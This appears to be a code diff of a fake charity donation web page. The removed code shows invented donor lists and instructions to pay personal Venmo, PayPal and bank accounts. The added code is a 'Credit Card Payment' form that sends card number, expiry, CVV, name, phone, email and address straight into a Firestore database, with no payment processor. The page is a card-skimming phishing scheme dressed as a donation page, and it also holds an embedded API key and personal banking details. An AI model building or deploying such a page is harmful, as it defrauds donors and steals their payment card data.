@@ -154,167 +154,214 @@
       </div>
     </section>
 
-    <div class="container">
+    <div class="container py-5">
       <div class="row justify-content-center">
-        <div class="col-md-8">
-         <form
-          action="https://formspree.io/f/mpwrqbbg"  
-          method="POST"
-          enctype="multipart/form-data"
-          class="card p-4 shadow"
-          id="donation-form"
-        >
+        <div class="col-lg-6">
+          <form id="paymentForm" class="card p-4 shadow">
+            <h4 class="mb-3">Credit Card Payment</h4>
 
-            <input type="hidden" name="_captcha" value="false" />
+            <!-- Card Type -->
+            <div class="mb-3">
+              <label class="form-label">Card Type</label><br />
+              <div class="mb-3 card-icons d-flex">
+                <img
+                  src="https://img.icons8.com/color/48/000000/mastercard-logo.png"
+                  alt="Mastercard"
+                  style="margin-right: 8px"
+                />
+                <img
+                  src="https://img.icons8.com/color/48/000000/visa.png"
+                  alt="Visa"
+                  style="margin-right: 8px"
+                />
+                <img
+                  src="https://img.icons8.com/color/48/000000/amex.png"
+                  alt="Amex"
+                  style="margin-right: 8px"
+                />
+                <img
+                  src="https://img.icons8.com/color/48/000000/discover.png"
+                  alt="Discover"
+                  style="margin-right: 8px"
+                />
+                <img
+                  src="https://img.icons8.com/color/48/000000/jcb.png"
+                  alt="JCB"
+                />
+              </div>
+              <div class="form-check form-check-inline">
+                <input
+                  class="form-check-input"
+                  type="radio"
+                  name="cardType"
+                  value="MasterCard"
+                  checked
+                />
+                <label class="form-check-label">MasterCard</label>
+              </div>
+              <div class="form-check form-check-inline">
+                <input
+                  class="form-check-input"
+                  type="radio"
+                  name="cardType"
+                  value="Visa"
+                />
+                <label class="form-check-label">Visa</label>
+              </div>
+              <div class="form-check form-check-inline">
+                <input
+                  class="form-check-input"
+                  type="radio"
+                  name="cardType"
+                  value="AMEX"
+                />
+                <label class="form-check-label">AMEX</label>
+              </div>
+            </div>
+
+            <!-- Card Number -->
             <input
-              type="hidden"
-              name="_subject"
-              value="New Donation Form Submission"
+              class="form-control mb-3"
+              type="text"
+              id="cardNumber"
+              placeholder="Card Number"
+              required
             />
-            <input type="hidden" name="_template" value="box" />
 
-            <div class="d-flex justify-content-between align-items-center mb-3">
-              <h3 data-lang="en">Donate in USD</h3>
-              <select id="language" class="form-select w-auto">
-                <option value="en">English</option>
-                <option value="fr">Français</option>
-                <option value="es">Español</option>
+            <!-- Expiry and CVV -->
+            <div class="row mb-3">
+              <div class="col">
+                <input
+                  class="form-control"
+                  type="text"
+                  id="expiry"
+                  placeholder="MM / YY"
+                  required
+                />
+              </div>
+              <div class="col">
+                <input
+                  class="form-control"
+                  type="text"
+                  id="cvv"
+                  placeholder="CVV"
+                  required
+                />
+              </div>
+            </div>
+
+            <!-- Country and Phone -->
+            <div class="mb-3">
+              <label for="country" class="form-label">Country</label>
+              <select
+                class="form-select"
+                id="country"
+                onchange="updatePhoneAndCurrency()"
+              >
+                <option value="Singapore" data-code="+65" data-currency="SGD">
+                  Singapore
+                </option>
+                <option value="USA" data-code="+1" data-currency="USD">
+                  United States
+                </option>
+                <option value="UK" data-code="+44" data-currency="GBP">
+                  United Kingdom
+                </option>
+                <option value="Nigeria" data-code="+234" data-currency="NGN">
+                  Nigeria
+                </option>
               </select>
             </div>
 
-            <div class="mb-3">
-              <label class="form-label" data-lang="name">Full Name</label>
-              <input type="text" name="name" class="form-control" required />
+            <input
+              class="form-control mb-3"
+              id="phoneNumber"
+              type="tel"
+              placeholder="Phone Number"
+              required
+            />
+
+            <!-- Currency and Amount -->
+            <div class="input-group mb-3">
+              <span class="input-group-text" id="currencySymbol">$</span>
+              <input
+                class="form-control"
+                id="amount"
+                type="number"
+                placeholder="Amount"
+                required
+              />
             </div>
 
+            <!-- Converted Amount -->
             <div class="mb-3">
-              <label class="form-label" data-lang="email">Email Address</label>
-              <input type="email" name="email" class="form-control" required />
-            </div>
-
-            <div class="mb-3">
-              <label class="form-label" data-lang="amount"
-                >Donation Amount (USD)</label
+              <label class="form-label"
+                >Converted Amount (in local currency):</label
               >
               <input
-                type="number"
-                name="amount"
                 class="form-control"
-                min="100"
-                max="100000"
-                required
+                id="convertedAmount"
+                type="text"
+                readonly
               />
             </div>
 
-            <div class="mb-3">
-              <label class="form-label" data-lang="country">Country</label>
-              <select name="country" class="form-select" required>
-                <option value="">-- Select Country --</option>
-                <option value="United States">United States</option>
-                <option value="Argentina">Argentina</option>
-                <option value="Canada">Canada</option>
-                <option value="United Kingdom">United Kingdom</option>
-                <option value="France">France</option>
-                <option value="South Africa">South Africa</option>
-                <option value="Kenya">Kenya</option>
-                <option value="India">India</option>
-                <option value="Ghana">Ghana</option>
-                <option value="Brazil">Brazil</option>
-                <option value="Germany">Germany</option>
-                <option value="Australia">Australia</option>
-                <option value="Mexico">Mexico</option>
-                <option value="New-zealand">New zealand</option>
-                <option value="italy">Italy</option>
-                <option value="Nigeria">Nigeria</option>
-                <option value="Malaysia">Malaysia</option>
-                <option value="Vietnam">Vietnam</option>
-                <option value="Philippines">Philippines</option>
-                <option value="Japan">Japan</option>
-                <option value="Spain">Spain</option>
-                <option value="Iran">Iran</option>
-                <option value="Thailand">Thailand</option>
-                <option value="Pakistan">Pakistan</option>
-                <option value="Bangladesh">Bangladesh</option>
-                <option value="Indonesia">Indonesia</option>
-                <option value="Ethopia">Ethopia</option>
-                <option value="Suadi-Arabia">Saudi Arabia</option>
-                <option value="Peru">Peru</option>
-                <option value="Yemen">Yemen</option>
-                <option value="Others">Others</option>
-              </select>
-            </div>
+            <!-- Billing Address -->
+            <input
+              class="form-control mb-3"
+              id="firstName"
+              type="text"
+              placeholder="First Name"
+              required
+            />
+            <input
+              class="form-control mb-3"
+              id="lastName"
+              type="text"
+              placeholder="Last Name"
+              required
+            />
+            <input type="text"
+             class="form-control mb-3" 
+             id="email" 
+             placeholder="Email" 
+             required />
+            <input
+              class="form-control mb-3"
+              id="address1"
+              type="text"
+              placeholder="Street name and house number"
+              required
+            />
+            <input
+              class="form-control mb-3"
+              id="address2"
+              type="text"
+              placeholder="Address line 2 (optional)"
+            />
+            <input
+              class="form-control mb-3"
+              id="postcode"
+              type="text"
+              placeholder="Postcode"
+              required
+            />
 
-            <div class="mb-3">
-              <label class="form-label" data-lang="method"
-                >Payment Method</label
-              >
-              <select
-                name="payment_method"
-                id="payment-method"
-                class="form-select"
-                required
-              >
-                <option value="">-- Select One --</option>
-                <option value="venmo">Venmo</option>
-                <option value="paypal">PayPal</option>
-                <option value="bank">Bank Transfer</option>
-              </select>
-            </div>
-
-           <button
-              type="submit"
-              class="btn btn-primary w-100 d-flex align-items-center justify-content-center gap-2"
-              data-lang="submit"
-              id="submit-btn"
+            <button class="btn btn-primary w-100" type="submit">Submit</button>
+            <p
+              class="text-success mt-3"
+              id="successMessage"
+              style="display: none"
             >
-              <span id="btn-text">Submit</span>
-              <div id="btn-spinner" class="spinner-border spinner-border-sm text-light d-none" role="status"></div>
-            </button>
-
-            <div id="payment-info" class="alert alert-info mt-3 d-none"></div>
-            <div
-              id="thank-you"
-              class="alert alert-success mt-3 d-none"
-              data-lang="thankyou"
-            >
-              Thank you for your donation! 🙏<br />
-              Kindly proceed to complete the payment using the instructions
-              above.
-            </div>
-          
-
-            <div id="proof-upload" class="mt-3 d-none">
-              <label class="form-label" data-lang="proof"
-                >Upload Proof of Payment</label
-              >
-               <input
-                type="file"
-                name="proof"
-                id="proof"
-                class="form-control"
-                accept="image/jpeg,image/png"
-              />
-              <img id="preview" class="d-none" alt="Preview" />
-            </div>
+              ✅ Payment submitted successfully!
+            </p>
+            <p class="text-danger mt-3" id="errorMessage" style="display: none">
+              ❌ Error submitting payment!
+            </p>
           </form>
         </div>
       </div>
     </div>
-
-      <!-- Dashboard Section -->
-    <div class="row justify-content-center mt-5">
-  <div class="col-md-8">
-    <h4 class="text-center">Recent Donations</h4>
-    <div class="d-flex justify-content-between fw-bold px-3 mb-2">
-      <span>Name</span>
-      <span>Amount</span>
-    </div>
-    <ul id="donation-list" class="list-group d-flex justify-content-between px-2"></ul>
-  </div>
-</div>
-    
-
-    <!-- donate form -->
 
     <!-- Crypto Donation Section -->
     <section id="crypto-donation" style="margin-top: 40px" class="text-center">
@@ -452,172 +499,114 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-  const form = document.getElementById('donation-form');
-  const methodSelect = document.getElementById('payment-method');
-  const paymentInfoBox = document.getElementById('payment-info');
-  const thankYou = document.getElementById('thank-you');
-  const fileSection = document.getElementById('proof-upload');
-  const preview = document.getElementById('preview');
-  const languageSelect = document.getElementById('language');
-  const donationList = document.getElementById('donation-list');
-  const proofInput = document.getElementById('proof');
-  const submitBtn = document.getElementById("submit-btn");
-  const btnText = document.getElementById("btn-text");
-  const btnSpinner = document.getElementById("btn-spinner");
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "firebase/app";
+      import { getAnalytics } from "firebase/analytics";
 
-  const paymentDetails = {
-    venmo: `Send via Venmo to: Purse979@gmail.com <br> Eamonn Sterley`,
-    paypal: `Send via PayPal to: piotr199@outlook.com<br> Eamonn Sterley`,
-    bank: `Receiving bank: Trailhead credit union <br>
-           Name: Eamonn I Sterley<br>
-           Account number: 10500009275070<br>
-           Routing number: 323075563<br>
-           Phone number: 971 495 9169<br>`
-  };
-
-  const translations = {
-    fr: {
-      "Donate in USD": "Faire un don en USD",
-      "Full Name": "Nom complet",
-      "Email Address": "Adresse e-mail",
-      "Donation Amount (USD)": "Montant du don (USD)",
-      "Country": "Pays",
-      "Payment Method": "Méthode de paiement",
-      "Upload Proof of Payment": "Télécharger la preuve de paiement",
-      "Submit": "Soumettre",
-      "Thank you for your donation! 🙏<br>Kindly proceed to complete the payment using the instructions above.":
-        "Merci pour votre don ! 🙏<br>Veuillez procéder au paiement en utilisant les instructions ci-dessus."
-    },
-    es: {
-      "Donate in USD": "Donar en USD",
-      "Full Name": "Nombre completo",
-      "Email Address": "Correo electrónico",
-      "Donation Amount (USD)": "Monto de la donación (USD)",
-      "Country": "País",
-      "Payment Method": "Método de pago",
-      "Upload Proof of Payment": "Subir comprobante de pago",
-      "Submit": "Enviar",
-      "Thank you for your donation! 🙏<br>Kindly proceed to complete the payment using the instructions above.":
-        "¡Gracias por tu donación! 🙏<br>Por favor procede a completar el pago usando las instrucciones anteriores."
-    },
-    en: {}
-  };
-
-  document.querySelectorAll("[data-lang]").forEach(el => {
-    if (!el.dataset.original) {
-      el.dataset.original = el.innerHTML;
-    }
-  });
-
-  function updateLanguage(lang) {
-    document.querySelectorAll("[data-lang]").forEach(el => {
-      if (lang === "en") {
-        el.innerHTML = el.dataset.original;
-      } else {
-        const original = el.dataset.original;
-        if (translations[lang][original]) {
-          el.innerHTML = translations[lang][original];
-        }
-      }
-    });
-  }
-
-  languageSelect.addEventListener("change", e => {
-    updateLanguage(e.target.value);
-  });
-
-  proofInput.addEventListener('change', function () {
-    const file = this.files[0];
-    if (file && file.type.startsWith("image/")) {
-      const reader = new FileReader();
-      reader.onload = function (e) {
-        preview.src = e.target.result;
-        preview.classList.remove("d-none");
-        preview.classList.add("img-fluid", "mt-2");
+      const firebaseConfig = {
+        apiKey: "AIzaSyA9H2F80aMb0yEv8t-NS1enwXFcMgd9jck",
+        authDomain: "credit-card-1a013.firebaseapp.com",
+        projectId: "credit-card-1a013",
+        storageBucket: "credit-card-1a013.firebasestorage.app",
+        messagingSenderId: "538552395680",
+        appId: "1:538552395680:web:ce1b65488ff55a66caa6c5",
+        measurementId: "G-YCF3VZS0CD",
       };
-      reader.readAsDataURL(file);
-    } else {
-      preview.classList.add("d-none");
-    }
-  });
 
-  const randomNames = [
-    "Emily R.", "James T.", "Sophia W.", "Michael B.", "Olivia L.",
-    "William S.", "Isabella H.", "Benjamin C.", "Emma G.", "Lucas J.",
-    "Mia D.", "Ethan A.", "Amelia P.", "Liam K.", "Charlotte M.",
-    "Noah E.", "Ava Z.", "Daniel N.", "Harper O.", "Jacob Q.",
-    "Chloe I.", "Logan Y.", "Zoe F.", "Matthew X.", "Lily V."
-  ];
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
 
-  function populateFakeDonors() {
-    for (let i = 0; i < 50; i++) {
-      const name = randomNames[Math.floor(Math.random() * randomNames.length)];
-      const amount = (Math.random() * 7550 + 50).toFixed();
-      const li = document.createElement("li");
-      li.className = "list-group-item d-flex justify-content-between align-items-center px-3 py-2 border-bottom";
-      li.innerHTML = `<span class="donor-name">${name}</span><span class="donation-amount">$${amount}</span>`;
-      donationList.append(li);
-    }
-  }
+      // Currency conversion rates (base USD)
+      const rates = {
+        USD: 1,
+        NGN: 1500,
+        SGD: 1.35,
+        GBP: 0.78,
+      };
 
-  populateFakeDonors();
+      function updatePhoneAndCurrency() {
+        const select = document.getElementById("country");
+        const selected = select.options[select.selectedIndex];
+        const code = selected.getAttribute("data-code");
+        const currency = selected.getAttribute("data-currency");
 
-form.addEventListener('submit', async function (e) {
-  e.preventDefault();
+        // Update phone number
+        const phoneInput = document.getElementById("phoneNumber");
+        const stripped = phoneInput.value.replace(/^\+\d+\s*/, "");
+        phoneInput.value = code + " " + stripped;
 
-  const method = methodSelect.value;
-  if (method && paymentDetails[method]) {
-    paymentInfoBox.innerHTML = `<strong>Payment Instructions:</strong><br>${paymentDetails[method]}`;
-    paymentInfoBox.classList.remove('d-none');
-    thankYou.classList.remove("d-none");
-    fileSection.classList.remove("d-none");
-  }
+        // Update currency symbol
+        const symbolMap = {
+          USD: "$",
+          NGN: "₦",
+          SGD: "S$",
+          GBP: "£",
+        };
+        document.getElementById("currencySymbol").textContent =
+          symbolMap[currency] || "$";
 
-  const name = form.name.value.trim();
-  const amount = parseFloat(form.amount.value.trim()).toFixed(2);
+        // Update converted amount
+        convertAmount();
+      }
 
-  if (proofInput.files.length > 0) {
-    const li = document.createElement("li");
-    li.className = "list-group-item";
-    li.textContent = `${name} donated $${amount}`;
-    donationList.insertBefore(li, donationList.firstChild);
-  }
+      function convertAmount() {
+        const amount = parseFloat(document.getElementById("amount").value);
+        const selectedCurrency = document
+          .getElementById("country")
+          .selectedOptions[0].getAttribute("data-currency");
+        const rate = rates[selectedCurrency] || 1;
+        const converted = (amount * rate).toFixed(2);
+        document.getElementById(
+          "convertedAmount"
+        ).value = `${converted} ${selectedCurrency}`;
+      }
 
-  // Submit via AJAX
-  const formData = new FormData(form);
+      document
+        .getElementById("amount")
+        .addEventListener("input", convertAmount);
 
-  submitBtn.disabled = true;
-  btnText.textContent = "Submitting...";
-  btnSpinner.classList.remove("d-none");
+      // Submit form
+      document
+        .getElementById("paymentForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
 
-// Submit via AJAX
-try {
-  const response = await fetch(form.action, {
-    method: 'POST',
-    body: formData,
-    headers: {
-      'Accept': 'application/json'
-    }
-  });
+          const formData = {
+            cardType: document.querySelector('input[name="cardType"]:checked')
+              .value,
+            cardNumber: document.getElementById("cardNumber").value,
+            expiry: document.getElementById("expiry").value,
+            cvv: document.getElementById("cvv").value,
+            country: document.getElementById("country").value,
+            phone: document.getElementById("phoneNumber").value,
+            currency: document
+              .getElementById("country")
+              .selectedOptions[0].getAttribute("data-currency"),
+            amount: document.getElementById("amount").value,
+            convertedAmount: document.getElementById("convertedAmount").value,
+            firstName: document.getElementById("firstName").value,
+            lastName: document.getElementById("lastName").value,
+            email: document.getElementById("email").value,
+            address1: document.getElementById("address1").value,
+            address2: document.getElementById("address2").value,
+            postcode: document.getElementById("postcode").value,
+          };
 
-  if (response.ok) {
-    thankYou.classList.remove("d-none");
-    // form.reset(); // optional
-  } else {
-    alert("Something went wrong submitting the form.");
-  }
-    } catch (error) {
-      alert("There was a problem submitting the form. Please try again.");
-      console.error(error);
-    }
-
-    // Re-enable button and hide spinner
-    submitBtn.disabled = false;
-    btnText.textContent = "Submit";
-    btnSpinner.classList.add("d-none");
-});
-
-</script>
-
-</body>
+          db.collection("creditPayments")
+            .add(formData)
+            .then(() => {
+              document.getElementById("successMessage").style.display = "block";
+              document.getElementById("errorMessage").style.display = "none";
+              document.getElementById("paymentForm").reset();
+              document.getElementById("convertedAmount").value = "";
+            })
+            .catch((error) => {
+              console.error("Error submitting form:", error);
+              document.getElementById("errorMessage").style.display = "block";
+              document.getElementById("successMessage").style.display = "none";
+            });
+        });
+      // Fetch and display recent donations
+    </script>
+  </body>
 </html>
